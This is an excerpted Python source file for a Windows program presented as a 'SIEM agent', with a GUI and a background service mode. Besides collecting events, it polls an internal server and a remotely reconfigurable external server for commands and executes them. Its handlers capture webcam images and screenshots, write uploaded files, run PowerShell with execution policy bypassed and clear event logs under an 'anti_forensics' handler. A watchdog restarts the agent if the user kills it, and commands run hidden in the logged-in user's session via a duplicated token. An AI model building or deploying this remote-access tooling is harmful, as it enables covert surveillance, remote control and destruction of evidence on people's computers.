...
class AdvancedEventCollector:
    ...
    def collect_all_comprehensive_events(self):
        ...
        for fn in (
            self.collect_rdp_events,
            getattr(self, 'collect_usb_events', None),
            self.collect_registry_changes,
            self.collect_suspicious_processes,
            self.collect_file_system_events,
            self.collect_antivirus_events,
            self.collect_firewall_events,
...
class JFSSIEMAgentComprehensive:
    def __init__(self, root):
        ...
        _mk_var = tk.StringVar if self.root is not None else _Var
        ...
        self.server_ip = _mk_var(value="192.168.1.52")
        self.server_port = _mk_var(value="80")
        self.external_scheme = _mk_var(value="")
        self.external_host = _mk_var(value="")
        self.external_port = _mk_var(value="")
        self.pc_name = _mk_var(value=socket.gethostname())
        self.status_text = _mk_var(value="Ready to start")
        self.connection_status = _mk_var(value="Disconnected")
        ...
        try:
            _write_health(headless_pid=int(os.getpid()), headless_started=int(time.time()))
        except Exception:
            pass
        self.shell_active = False

        self.remote_command_thread_external = None
        
        # Load persisted config (APPDATA)
        self.load_agent_config()

        # Register agent with collector on startup (internal)
        self.register_agent_with_collector()
        
        self._agent_log_path = None
    ...
    def _setup_agent_logging(self):
        try:
            ...
            try:
                ...
                if appdata:
                    base_dir = os.path.join(appdata, 'JFS_SIEM_Agent', 'logs')
                    os.makedirs(base_dir, exist_ok=True)
            except Exception:
                base_dir = None
            ...
            if not base_dir:
                try:
                    base_dir = os.path.join(tempfile.gettempdir(), 'JFS_SIEM_Agent', 'logs')
                    os.makedirs(base_dir, exist_ok=True)
                except Exception:
                    base_dir = None

            if base_dir:
                self._agent_log_path = os.path.join(base_dir, 'agent.log')
                with open(self._agent_log_path, 'a', encoding='utf-8'):
                    pass
        except Exception:
            self._agent_log_path = None
    ...
    def _log_agent(self, msg):
        try:
            ...
            line = f"{ts} {msg}\n"
            if getattr(self, '_agent_log_path', None):
                try:
    ...
    def _test_internal_connectivity(self):
        try:
    ...
    def _run_elevated(self, args):
        try:
            params = ' '.join([f'"{a}"' if ' ' in a else a for a in args])
            exe_to_run = self._get_exe_path()
            ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_to_run, params, None, 1)
            return True
        except Exception:
            return False
    ...
    def _get_service_binpath(self):
        exe_path = self._get_exe_path()
        # sc.exe is picky: we want SCM to store a quoted EXE path + args
        return f'\\"{exe_path}\\" --run-service'

    def _get_systemprofile_config_path(self):
        try:
    ...
    def _get_config_path(self):
        try:
            ...
            if programdata:
                base_dir = os.path.join(programdata, 'JFS_SIEM_Agent')
                os.makedirs(base_dir, exist_ok=True)
                return os.path.join(base_dir, 'agent_config.json')
        except Exception:
            pass
        ...
        try:
            sys_cfg = self._get_systemprofile_config_path()
            if sys_cfg:
                sys_dir = os.path.dirname(sys_cfg)
        ...
        try:
            base_dir = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'JFS_SIEM_Agent')
            os.makedirs(base_dir, exist_ok=True)
            return os.path.join(base_dir, 'agent_config.json')
        except Exception:
            return os.path.join(os.path.dirname(__file__), 'agent_config.json')

    def _migrate_config_locations(self):
        try:
            programdata = os.environ.get('PROGRAMDATA')
            if not programdata:
                return
            programdata_cfg = os.path.join(programdata, 'JFS_SIEM_Agent', 'agent_config.json')
            sys_cfg = self._get_systemprofile_config_path()
            if not sys_cfg:
                return

            # If ProgramData config exists, always prefer it and overwrite stale systemprofile config.
            if os.path.exists(programdata_cfg):
                try:
                    sys_dir = os.path.dirname(sys_cfg)
                    os.makedirs(sys_dir, exist_ok=True)
                    if (not os.path.exists(sys_cfg)) or (os.path.getmtime(sys_cfg) < os.path.getmtime(programdata_cfg)):
                        import shutil
                        shutil.copy2(programdata_cfg, sys_cfg)
                except Exception:
                    pass
        except Exception:
            pass
    ...
    def load_agent_config(self):
        try:
            self._migrate_config_locations()
            ...
            if internal.get('host'):
                self.server_ip.set(str(internal.get('host')))
            if internal.get('port'):
                self.server_port.set(str(internal.get('port')))

            if external.get('scheme'):
                self.external_scheme.set(str(external.get('scheme')))
            if external.get('host'):
                self.external_host.set(str(external.get('host')))
            if external.get('port'):
                self.external_port.set(str(external.get('port')))
        except Exception:
            pass
    ...
    def save_agent_config(self):
        try:
            ...
            cfg = {
                ...
                'external': {
                    'scheme': self.external_scheme.get(),
                    'host': self.external_host.get(),
                    'port': self.external_port.get(),
                },
                'agent_name': self.pc_name.get(),
            }
...
The service will run in the background with no window."""
        ...
        watchdog_frame = tk.Frame(install_card, bg=BG_SURFACE)
        watchdog_frame.pack(fill=tk.X, padx=20, pady=(0, 20))

        watchdog_install_btn = tk.Button(
            watchdog_frame,
            text="🛡️  INSTALL WATCHDOG",
            command=self.install_watchdog,
            font=("Segoe UI", 11, "bold"),
            bg=ACCENT_COLOR,
            fg="#000000",
            relief=tk.FLAT,
        ...
        watchdog_install_btn.pack(side=tk.LEFT, padx=(0, 10))

        watchdog_remove_btn = tk.Button(
            watchdog_frame,
            text="🧹  REMOVE WATCHDOG",
            command=self.uninstall_watchdog,
            font=("Segoe UI", 11, "bold"),
            bg="#555555",
            fg=TEXT_PRIMARY,
            relief=tk.FLAT,
        ...
        watchdog_remove_btn.pack(side=tk.LEFT)
...
© 2025 JFS ICT Services"""
    ...
    def install_service(self):
        ...
        try:
            ...
            if not self.is_admin():
                ok = self._run_elevated(["--install-service"])
                if ok:
                    messagebox.showinfo("Admin Required", "Please approve the UAC prompt to install the service.")
                else:
                    messagebox.showerror("Error", "Could not request elevation (UAC).")
                return

            bin_path = self._get_service_binpath()
            subprocess.run("sc stop JFSSIEMAgent", shell=True, capture_output=True, text=True)
            subprocess.run("sc delete JFSSIEMAgent", shell=True, capture_output=True, text=True)

            create_cmd = f"sc create JFSSIEMAgent binPath= \"{bin_path}\" start= auto"
            create_res = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
            if create_res.returncode != 0:
                details = (create_res.stdout or "") + ("\n" + create_res.stderr if create_res.stderr else "")
                messagebox.showerror("Error", f"Failed to create service.\n\nCommand:\n{create_cmd}\n\nOutput:\n{details.strip()}")
                self.status_text.set(" Service installation failed")
                return

            query_res = subprocess.run("sc query JFSSIEMAgent", shell=True, capture_output=True, text=True)
            if query_res.returncode != 0:
                details = (query_res.stdout or "") + ("\n" + query_res.stderr if query_res.stderr else "")
                messagebox.showerror("Error", f"Service create returned success, but the service is not queryable.\n\nOutput:\n{details.strip()}")
                self.status_text.set(" Service installation failed")
                return

            subprocess.run("sc description JFSSIEMAgent \"JFS SIEM Agent Service\"", shell=True, capture_output=True, text=True)
            start_res = subprocess.run("sc start JFSSIEMAgent", shell=True, capture_output=True, text=True)
            if start_res.returncode != 0:
                details = (start_res.stdout or "") + ("\n" + start_res.stderr if start_res.stderr else "")
                messagebox.showwarning("Warning", f"Service installed but failed to start automatically.\n\nOutput:\n{details.strip()}\n\nCheck services.msc and try starting it manually.")
                self.status_text.set(" Service installed (start failed)")
                return

            try:
                _configure_service_recovery('JFSSIEMAgent')
            except Exception:
                pass
    ...
    def install_watchdog(self):
        try:
            result = messagebox.askyesno(
                "Install Watchdog",
                "This will install the Watchdog service.\n\n"
                "The Watchdog will automatically restart the agent if the user kills it.\n\n"
                "Continue?")
            ...
            if not self.is_admin():
                ok = self._run_elevated(["--install-watchdog"])
                if ok:
                    messagebox.showinfo("Admin Required", "Please approve the UAC prompt to install the watchdog.")
                else:
                    messagebox.showerror("Error", "Could not request elevation (UAC).")
                return

            subprocess.run("sc stop JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)
            subprocess.run("sc delete JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)

            exe_path = self._get_exe_path()
            bin_path = f'\\"{exe_path}\\" --run-watchdog'
            create_cmd = f"sc create JFSSIEMAgentWatchdog binPath= \"{bin_path}\" start= auto"
            create_res = subprocess.run(create_cmd, shell=True, capture_output=True, text=True)
            if create_res.returncode != 0:
                details = (create_res.stdout or "") + ("\n" + create_res.stderr if create_res.stderr else "")
                messagebox.showerror("Error", f"Failed to create watchdog.\n\nCommand:\n{create_cmd}\n\nOutput:\n{details.strip()}")
                self.status_text.set(" Watchdog install failed")
                return

            subprocess.run("sc description JFSSIEMAgentWatchdog \"JFS SIEM Agent Watchdog\"", shell=True, capture_output=True, text=True)
            subprocess.run("sc start JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)

            try:
                _configure_service_recovery('JFSSIEMAgentWatchdog')
            except Exception:
                pass

            messagebox.showinfo("Success", "Watchdog installed successfully!\n\nService name: JFSSIEMAgentWatchdog")
            self.status_text.set(" Watchdog installed")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to install watchdog:\n{e}")
            self.status_text.set(" Watchdog install failed")

    def uninstall_watchdog(self):
        try:
            result = messagebox.askyesno(
                "Remove Watchdog",
                "This will stop and remove the Watchdog service.\n\nContinue?")
            
            if not result:
                return

            if not self.is_admin():
                ok = self._run_elevated(["--remove-watchdog"])
                if ok:
                    messagebox.showinfo("Admin Required", "Please approve the UAC prompt to remove the watchdog.")
                else:
                    messagebox.showerror("Error", "Could not request elevation (UAC).")
                return
            ...
            subprocess.run("sc stop JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)
            subprocess.run("sc delete JFSSIEMAgentWatchdog", shell=True, capture_output=True, text=True)
            messagebox.showinfo("Success", "Watchdog removed successfully!")
            self.status_text.set(" Watchdog removed")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to remove watchdog:\n{e}")
            self.status_text.set(" Watchdog removal failed")
    ...
    def uninstall_service(self):
        ...
        try:
            ...
            if not self.is_admin():
                ok = self._run_elevated(["--remove-service"])
                if ok:
                    messagebox.showinfo("Admin Required", "Please approve the UAC prompt to remove the service.")
                else:
                    messagebox.showerror("Error", "Could not request elevation (UAC).")
                return

            subprocess.run("sc stop JFSSIEMAgent", shell=True, capture_output=True, text=True)
            del_res = subprocess.run("sc delete JFSSIEMAgent", shell=True, capture_output=True, text=True)
            if del_res.returncode != 0:
                details = (del_res.stdout or "") + ("\n" + del_res.stderr if del_res.stderr else "")
                messagebox.showerror("Error", f"Failed to delete service.\n\nOutput:\n{details.strip()}")
                return
    ...
    def start_agent(self):
        ...
        ok, err = self._test_internal_connectivity()
        if ok:
            self.update_status_indicator(True)
        else:
            self.update_status_indicator(False)
            self.status_text.set(f"Disconnected: {err[:80]}")
            try:
        ...
        self.remote_command_thread_external = threading.Thread(target=self.check_remote_commands_external, daemon=True)
        self.remote_command_thread_external.start()
    ...
    def check_remote_commands(self):
        ...
        self._log_agent("Starting command polling thread")
        while self.agent_running:
            try:
                url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/remote-access.php?action=get_pending_commands&agent={self.pc_name.get()}"

                self._log_agent(f"Polling: {url}")
                response = requests.get(url, timeout=5)
                self._log_agent(f"Poll response: HTTP {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('commands'):
                        self._log_agent(f"Commands received: {len(data['commands'])}")
                    ...
                    if data.get('commands'):
                        for cmd_data in data['commands']:
                            ...
                            self._log_agent(f"Executing cmd_id={cmd_id} command={command}")
                            
                            if cmd_id in self.executed_commands:
                                self._log_agent(f"cmd_id={cmd_id} already executed, skipping")
                                continue
                            ...
                            cmd_thread.start()
                            self._log_agent(f"Execution thread started for cmd_id={cmd_id}")
                
                time.sleep(2)
            except Exception as e:
                self._log_agent(f"Poll error: {repr(e)}")
    ...
    def _execute_command_async_to_server(self, cmd_id, command, server_base_url, dedupe_key=None):
        """Execute command and report result to the specified SIEM server base URL"""
        try:
            if dedupe_key and dedupe_key in self.executed_commands:
                return
            if dedupe_key:
                self.executed_commands.add(dedupe_key)
            ...
            self.send_to_remote_terminal_to_server(server_base_url, cmd_id, terminal_output, result['output'], result['error'])
        except Exception as e:
            self.send_to_remote_terminal_to_server(server_base_url, cmd_id, f"ERROR: {str(e)}", "", str(e))

    def send_to_remote_terminal_to_server(self, server_base_url, cmd_id, terminal_output, output, error):
        """Report command output to a specific server"""
        try:
            url = f"{server_base_url}/SIEM/api/remote-access.php?action=report_command&id={cmd_id}"
            requests.post(url, json={
                'result': 'success' if not error else 'failed',
                'output': output or terminal_output or '',
                'error': error or ''
            }, timeout=5)
        except Exception as e:
            print(f"[REPORT] Failed to report command to {server_base_url}: {str(e)}")

    def check_remote_commands_external(self):
        """Check for remote commands from external SIEM server"""
        while self.agent_running:
            try:
                scheme = (self.external_scheme.get() or 'http').strip().lower()
                host = (self.external_host.get() or '').strip()
                port = (self.external_port.get() or '').strip()
                if not host or not port:
                    time.sleep(5)
                    continue

                base_url = f"{scheme}://{host}:{port}"
                url = f"{base_url}/SIEM/api/remote-access.php?action=get_pending_commands&agent={self.pc_name.get()}"
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('commands'):
                        for cmd_data in data['commands']:
                            cmd_id = cmd_data.get('id')
                            command = cmd_data.get('command')
                            dedupe_key = f"external:{cmd_id}"
                            if dedupe_key in self.executed_commands:
                                continue
                            cmd_thread = threading.Thread(
                                target=self._execute_command_async_to_server,
                                args=(cmd_id, command, base_url, dedupe_key),
                                daemon=True
                            )
                            cmd_thread.start()
                time.sleep(2)
    ...
    def restart_external_polling(self):
        try:
            if self.agent_running:
                if not self.remote_command_thread_external or not self.remote_command_thread_external.is_alive():
                    self.remote_command_thread_external = threading.Thread(target=self.check_remote_commands_external, daemon=True)
                    self.remote_command_thread_external.start()
        except Exception:
            pass
    ...
    def execute_in_shell(self, command):
        ...
        try:
            # Remote Terminal routing prefix - strip before processing
            if isinstance(command, str) and command.lower().startswith('rt:'):
                command = command[3:]
...
'''
            ...
            # Remote configuration for external command server (stored in APPDATA config)
            # - config:external:show
            # - config:external:disable
            # - config:external:set:http|host|port
            if command.lower().startswith('config:external:'):
                action = command[len('config:external:'):].strip()
                if action == 'show':
                    scheme = (self.external_scheme.get() or '').strip()
                    host = (self.external_host.get() or '').strip()
                    port = (self.external_port.get() or '').strip()
                    enabled = bool(scheme and host and port)
                    return (
                        f"External command server: {'ENABLED' if enabled else 'DISABLED'}\n"
                        f"Scheme: {scheme or '(unset)'}\n"
                        f"Host: {host or '(unset)'}\n"
                        f"Port: {port or '(unset)'}",
                        ""
                    )

                if action == 'disable':
                    self.external_scheme.set('')
                    self.external_host.set('')
                    self.external_port.set('')
                    self.save_agent_config()
                    return "External command server DISABLED", ""

                if action.startswith('set:'):
                    payload = action[len('set:'):]
                    parts = payload.split('|')
                    if len(parts) != 3:
                        return "Usage: config:external:set:http|host|port", ""
                    scheme, host, port = parts[0].strip(), parts[1].strip(), parts[2].strip()
                    ...
                    # Set + persist
                    self.external_scheme.set(scheme)
                    self.external_host.set(host)
                    self.external_port.set(port)
                    self.save_agent_config()

                    # Try a quick connectivity check (non-fatal)
                    try:
                        base_url = f"{scheme}://{host}:{port}"
                        test_url = f"{base_url}/SIEM/api/remote-access.php?action=get_pending_commands&agent={self.pc_name.get()}"
                        r = requests.get(test_url, timeout=5)
                        status = f"HTTP {r.status_code}"
                    except Exception as e:
                        status = f"ERROR: {str(e)}"

                    # Ensure polling thread exists
                    self.restart_external_polling()
                    return f"External command server set to {scheme}://{host}:{port}\nTest: {status}", ""

                return "Usage: config:external:show | config:external:disable | config:external:set:http|host|port", ""
            ...
            # PowerShell JSON (Task Manager)
            # Format: powershell_json:<powershell script that outputs JSON>
            if command.lower().startswith('powershell_json:'):
                ps_script = command[len('powershell_json:'):].strip()
                return self.handle_powershell_json(ps_script)
            ...
            # Webcam snapshot
            if command.lower() in ('webcam', 'webcam:snap', 'webcam:snapshot', 'webcam:photo'):
                return self.handle_webcam_snapshot(), ""
...
Type 'help' for this list"""
    ...
    def handle_powershell_json(self, ps_script: str):
        try:
            # Always return JSON so the UI can parse reliably.
            if not ps_script:
                return '{"error":"empty powershell script"}', ''

            # NOTE: In frozen PyInstaller builds, multiprocessing targets must be picklable and
            # nested functions break with: "Can't get local object ...".
            # Use Popen + communicate(timeout) and kill the process tree on timeout.
            ...
            try:
                ...
                cmd = ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-OutputFormat', 'Text', '-EncodedCommand', encoded]
            except Exception:
                cmd = ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-OutputFormat', 'Text', '-Command', ps_script]
            ...
            try:
                ...
                try:
                    # Ensure full tree is terminated
                    subprocess.run(
                ...
                return '{"error":"powershell_json hard timeout"}', ''

            out = (out or '').strip()
            err = (err or '').strip()

            # Some endpoints return PowerShell CLIXML formatting on errors which breaks JSON parsing in UI.
            # Prefer extracting the first JSON object/array from stdout, ignoring any other noise.
            if out:
                lo = out.lower()
                if '#< clixml' in lo or '<objs' in lo or 'parentcontainserrorrecordexception' in lo:
                    safe = out.replace('\\', '\\\\').replace('"', '\\"')
                    return '{"error":"powershell returned clixml instead of json","raw":"' + safe[:800] + '"}', ''
                ...
                if starts:
                    start = min(starts)
                    candidate = out[start:].strip()
                    # Return candidate; UI will JSON.parse. If candidate isn't valid JSON, it will error.
    ...
    def handle_file_upload(self, file_info):
        ...
        try:
            # Supported formats:
            # 1) upload:<dest_path>
            # 2) upload:<dest_path>|<base64data>
            raw = (file_info or '').strip()
            if '|' not in raw:
                dest_path = raw.strip('"\'')
                return f"✓ File upload ready\nDestination: {dest_path}\nNote: Paste file via UI (upload not implemented in this command format)"

            dest_path, b64data = raw.split('|', 1)
            dest_path = dest_path.strip().strip('"\'')
            b64data = b64data.strip()
            if not dest_path:
                return "ERROR: upload destination path required"
            if not b64data:
                return "ERROR: upload data missing"

            try:
                file_bytes = base64.b64decode(b64data)
            except Exception as e:
                return f"ERROR: invalid base64 upload data: {str(e)}"
    ...
    def handle_webcam_snapshot(self):
        """Capture a single webcam frame and return as base64 JPEG marker."""
        try:
            try:
                import cv2
            except Exception:
                return "ERROR: Webcam feature requires OpenCV (cv2) which is not available in this build"

            cap = None
            try:
                cap = cv2.VideoCapture(0)
                if not cap or not cap.isOpened():
                    return "ERROR: Could not open webcam (no camera or access denied)"
                ok, frame = cap.read()
                if not ok or frame is None:
                    return "ERROR: Failed to capture webcam frame"
                try:
                    # Reduce payload size to improve reliability through DB/API layers.
                    max_w = 1024
                    if hasattr(frame, 'shape') and len(frame.shape) >= 2:
                        ...
                        if w and w > max_w:
                            ...
                            nh = int(h * scale)
                            frame = cv2.resize(frame, (max_w, max(1, nh)))
                except Exception:
                    pass

                ok2, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                if not ok2:
                    return "ERROR: Failed to encode webcam image"
                img_b64 = base64.b64encode(buf.tobytes()).decode('utf-8')
                filename = f"webcam_{int(time.time())}.jpg"
                try:
                    size = int(len(buf.tobytes()))
                except Exception:
                    size = 0
                return f"###FILE_DOWNLOAD###|{filename}|{size}|{img_b64}###END_FILE###"
            finally:
                try:
                    if cap is not None:
                        cap.release()
            ...
            return f"ERROR: Webcam snapshot failed: {str(e)}"
    ...
    def handle_anti_forensics(self, action):
        ...
        try:
            if action == 'clearlogs':
                ...
                try:
                    # When running as LocalSystem (service), we may still need to enable the
                    # security privilege to clear certain logs like Security.
                    if win32security and win32api:
                        try:
                            ...
                            for priv_name in (
                                ...
                                try:
                                    ...
                                    win32security.AdjustTokenPrivileges(htok, False, [(luid, win32security.SE_PRIVILEGE_ENABLED)])
                                except Exception:
                                    pass
                            try:
                ...
                if 'Error' in result or 'Access is denied' in result:
                    try:
                        who = os.popen('whoami').read().strip().lower()
                    except Exception:
                        who = ''
                    if 'system' in who:
                        return "⚠ Event logs: Access denied\nNote: Running as SYSTEM. This usually means SeSecurityPrivilege is missing or the log provider denies clearing in this context."
    ...
    def send_event(self, event_data):
        ...
        try:
            ...
            if response.status_code == 200:
                self.events_sent += 1
                return True
            self._log_agent(f"send_event failed HTTP {response.status_code}: {response.text[:200]}")
            return False
        except Exception as e:
            self._log_agent(f"send_event exception: {repr(e)}")
            return False
...
def _service_log_setup_programdata():
    log_path = None
    base_dir = None

    # First preference: ProgramData (works for both user-session and service-session)
    programdata = os.environ.get('PROGRAMDATA')
    if programdata:
        try:
            base_dir = os.path.join(programdata, 'JFS_SIEM_Agent', 'logs')
            os.makedirs(base_dir, exist_ok=True)
    ...
    if not log_path:
        try:
            ...
            base_dir = os.path.join(exe_dir, 'logs')
            os.makedirs(base_dir, exist_ok=True)
            log_path = os.path.join(base_dir, 'service.log')
        except Exception:
            base_dir = None
...
def _acquire_instance_lock(lock_name: str) -> bool:
    try:
        base_dir = _get_programdata_dir()
        if not base_dir:
            return True
        ...
        try:
            ...
            # If lock exists, check if PID is alive; if not, steal the lock.
            stale_pid = None
            try:
                with open(lock_path, 'r', encoding='utf-8') as f:
                    txt = (f.read() or '').strip()
                stale_pid = int(txt) if txt else None
            except Exception:
                stale_pid = None
            is_alive = False
            if stale_pid:
                try:
                    is_alive = psutil.pid_exists(int(stale_pid))
                except Exception:
                    is_alive = False
            if not is_alive:
                try:
...
def _configure_service_recovery(service_name: str) -> bool:
    try:
        if not service_name:
            return False
        subprocess.run(
            f"sc failure {service_name} reset= 0 actions= restart/5000/restart/5000/restart/5000",
            shell=True,
            capture_output=True,
            text=True
        )
...
def _get_headless_pid_path():
    base_dir = _get_programdata_dir()
    if base_dir:
        return os.path.join(base_dir, 'headless.pid')
    return None


def _get_watchdog_lock_path():
    base_dir = _get_programdata_dir()
    if base_dir:
        return os.path.join(base_dir, 'watchdog.lock')
    return None
...
def _get_health_path():
    base_dir = _get_programdata_dir()
    if base_dir:
        return os.path.join(base_dir, 'health.json')
    return None


def _write_health(**fields):
    try:
        hp = _get_health_path()
        if not hp:
            return
...
def _clear_file_in_programdata(filename: str):
    try:
        base_dir = _get_programdata_dir()
        if not base_dir:
            return
...
def _read_headless_pid():
    try:
        pid_path = _get_headless_pid_path()
...
def _write_headless_pid(pid: int):
    try:
        pid_path = _get_headless_pid_path()
        if not pid_path:
            return
...
def _is_valid_headless_pid(pid: int) -> bool:
    try:
        p = psutil.Process(int(pid))
        cmdline = p.cmdline() or []
        cmdline_l = [str(x).lower() for x in cmdline]
        if '--run-agent-headless' not in cmdline_l:
            return False
        return True
    except Exception:
        return False
...
class _SharedRemoteCommandShell:
    def __init__(self, log_fn=None):
        ...
        # Create a GUI agent instance without UI (root=None). This preserves the full
        # command router + 100+ handle_* methods while keeping headless Tk-free.
        self._agent = JFSSIEMAgentComprehensive(None)

        try:
            self._agent._log_agent = lambda msg: self._log(str(msg))
        except Exception:
            pass

        try:
            self._agent.handle_screenshot_command = self.handle_screenshot_command
        except Exception:
            pass

    def _is_running_as_system(self) -> bool:
        try:
            import getpass
            u = (getpass.getuser() or '').lower()
            return u in ('system', 'localsystem')
        except Exception:
            return False

    def _run_in_active_user_session(self, command: str, timeout_seconds: int = 35):
        try:
            if not command:
                return '', 'empty command'

            # Expand common Windows env vars that cmd.exe would normally expand interactively.
            # Many terminal commands use %VAR% syntax.
            try:
            ...
            try:
                ...
                sid = 0xFFFFFFFF
            if sid == 0xFFFFFFFF:
                return '', 'No active interactive user session (no user logged in)'

            if not win32security or not win32process or not win32event:
                return '', 'pywin32 not available to spawn interactive session process'

            hUserToken = None
            hDupToken = None
            try:
                # Ensure required privileges are enabled for CreateProcessAsUser.
                try:
                    hProcTok = win32security.OpenProcessToken(
                        win32api.GetCurrentProcess(),
                        win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
                    )
                    for priv_name in ("SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"):
                        try:
                            luid = win32security.LookupPrivilegeValue(None, priv_name)
                            win32security.AdjustTokenPrivileges(hProcTok, False, [(luid, win32security.SE_PRIVILEGE_ENABLED)])
                        except Exception:
                            pass
                    try:
                        win32api.CloseHandle(hProcTok)
                    except Exception:
                        pass
                except Exception:
                    pass
                ...
                try:
                    hUserToken = win32ts.WTSQueryUserToken(int(sid))
                except Exception as e:
                    return '', f'WTSQueryUserToken failed: {repr(e)}'

                try:
                    hDupToken = win32security.DuplicateTokenEx(
                        hUserToken,
                    ...
                    return '', f'DuplicateTokenEx failed: {repr(e)}'

                temp_dir = None
                try:
                    programdata = os.environ.get('PROGRAMDATA')
                    if programdata:
                        temp_dir = os.path.join(programdata, 'JFS_SIEM_Agent', 'tmp')
                        os.makedirs(temp_dir, exist_ok=True)
                except Exception:
                    temp_dir = None
                if not temp_dir:
                    temp_dir = os.path.join(tempfile.gettempdir(), 'JFS_SIEM_Agent')
                    os.makedirs(temp_dir, exist_ok=True)

                out_path = os.path.join(temp_dir, f'rt_out_{int(time.time()*1000)}.txt')
                err_path = os.path.join(temp_dir, f'rt_err_{int(time.time()*1000)}.txt')

                comspec = os.environ.get('COMSPEC') or 'cmd.exe'
                cmdline = f'"{comspec}" /d /q /c {command} 1>"{out_path}" 2>"{err_path}"'

                try:
                    self._log(f'rt: sid={int(sid)} spawning as user cmd={cmdline[:200]}...')
                except Exception:
                    pass

                try:
                    env = win32profile.CreateEnvironmentBlock(hDupToken, False) if win32profile else None
                except Exception:
                    env = None
                ...
                try:
                    flags = getattr(win32process, 'CREATE_NO_WINDOW', 0) | getattr(win32process, 'CREATE_UNICODE_ENVIRONMENT', 0)
                except Exception:
                    flags = 0
                ...
                try:
                    ...
                    try:
                        err_no = int(win32api.GetLastError())
                    except Exception:
                        err_no = None
                    msg = f'CreateProcessAsUser failed: {repr(e)}'
                    if err_no is not None:
                        msg += f' (GetLastError={err_no})'
                    try:
                        self._log(f'rt: {msg}')
                    except Exception:
                        pass
                ...
                try:
                    rc = win32event.WaitForSingleObject(hProcess, int(timeout_seconds * 1000))
                    if rc != win32event.WAIT_OBJECT_0:
                        try:
                            win32process.TerminateProcess(hProcess, 1)
                        except Exception:
                            pass
                        return '', f'Command timeout after {timeout_seconds}s'
                ...
                if exit_code not in (None, 0) and not err_txt:
                    err_txt = f'Process exit code {exit_code}'

                try:
                    self._log(f'rt: done exit={exit_code} out_len={len(out_txt or "")} err_len={len(err_txt or "")}')
                except Exception:
                    pass

                return (out_txt or '').strip(), (err_txt or '').strip()
            finally:
                try:
                    if hDupToken is not None:
                        win32api.CloseHandle(hDupToken)
                except Exception:
                    pass
                try:
                    if hUserToken is not None:
                        win32api.CloseHandle(hUserToken)
                except Exception:
                    pass
        except Exception as e:
            return '', str(e)

    def set_context(self, pc_name: str, server_ip: str, server_port: str):
        self._pc_name = pc_name or ''
        self._server_ip = server_ip or ''
        self._server_port = server_port or ''

        try:
            self._agent.pc_name.set(self._pc_name)
            self._agent.server_ip.set(self._server_ip)
            self._agent.server_port.set(self._server_port)
        except Exception:
            pass

    def execute(self, command: str, timeout_seconds: int = 35):
        try:
            if self._is_running_as_system():
                out, err = self._run_in_active_user_session(command, timeout_seconds=timeout_seconds)
                # Do NOT silently fall back to SYSTEM execution for Remote Terminal.
                # If we can't run as the interactive user, return a clear error.
                if err:
                    return '', f'ERROR: Remote Terminal could not run in active user session: {err}'
                return out, ''
            return self._agent.execute_in_shell(command)
        except Exception as e:
            return '', str(e)
    ...
    def handle_screenshot_command(self):
        try:
            try:
                ...
                sid = 0xFFFFFFFF
            if sid == 0xFFFFFFFF:
                return "ERROR: No active interactive user session. Screenshot requires a logged-in desktop session."
...
class _HeadlessAgentRunner:
    def __init__(self, log_fn=None):
        ...
        self.event_collector = AdvancedEventCollector(self._pc_name)
        self._shell = _SharedRemoteCommandShell(log_fn=self._log)
        try:
            self._log(f'headless runner init pc={self._pc_name} server={self._server_ip}:{self._server_port}')
        except Exception:
            pass

    def execute_command(self, command: str, timeout_seconds: int = 35):
        # Use the same command router as the GUI agent, but without any Tk dependencies.
        # This enables all advanced prefixes (screenshot, download:, monitor:, recon:, etc.)
        # while keeping the headless runner stable.
        if not command:
            return '', 'empty command'
        try:
            self._shell.set_context(
                pc_name=self._pc_name,
                server_ip=self._server_ip,
                server_port=self._server_port,
            )
            return self._shell.execute(command, timeout_seconds=timeout_seconds)
        except Exception as e:
            return '', str(e)

    def _report_command(self, cmd_id, output: str, error: str):
        try:
            if not self._server_ip or not self._server_port:
                return
            url = f"http://{self._server_ip}:{self._server_port}/SIEM/api/remote-access.php?action=report_command&id={cmd_id}"
            payload = {
                'result': 'success' if not error else 'failed',
                'output': output or '',
                'error': error or ''
            ...
            self._log(f'report_command HTTP {r.status_code}')
        except Exception as e:
            self._log(f'report_command exception: {repr(e)}')
    ...
    def _get_config_path(self):
        ...
        try:
            ...
            return os.path.join(os.path.dirname(sys.executable), 'agent_config.json')

    def load_agent_config(self):
        try:
            config_path = self._get_config_path()
            if not os.path.exists(config_path):
                self._log(f"config not found: {config_path} (service will idle until configured)")
                return
            with open(config_path, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            internal = cfg.get('internal', {})
            external = cfg.get('external', {})
            if internal.get('host'):
                self._server_ip = str(internal.get('host'))
            if internal.get('port'):
                self._server_port = str(internal.get('port'))
            if external.get('scheme'):
                self._ext_scheme = str(external.get('scheme'))
            if external.get('host'):
                self._ext_host = str(external.get('host'))
            if external.get('port'):
                self._ext_port = str(external.get('port'))

            self._log(f"config loaded from {config_path} internal={self._server_ip}:{self._server_port}")
        except Exception as e:
            self._log(f"load_agent_config exception: {repr(e)}")

    def send_event(self, event_data):
        try:
            if not self._server_ip or not self._server_port:
                return False
            url = f"http://{self._server_ip}:{self._server_port}/SIEM/api/agent-collector.php"
            r = requests.post(url, json=event_data, timeout=5)
            if r.status_code != 200:
                self._log(f"send_event HTTP {r.status_code}: {r.text[:200]}")
                return False
            try:
                _write_health(last_event_ok=int(time.time()))
            except Exception:
                pass
            return True
        except Exception as e:
            self._log(f"send_event exception: {repr(e)}")
            return False

    def agent_loop(self):
        while self.agent_running:
            try:
                events = self.event_collector.collect_all_comprehensive_events() or []
                try:
                    self._log(f'agent_loop cycle events={len(events)}')
                except Exception:
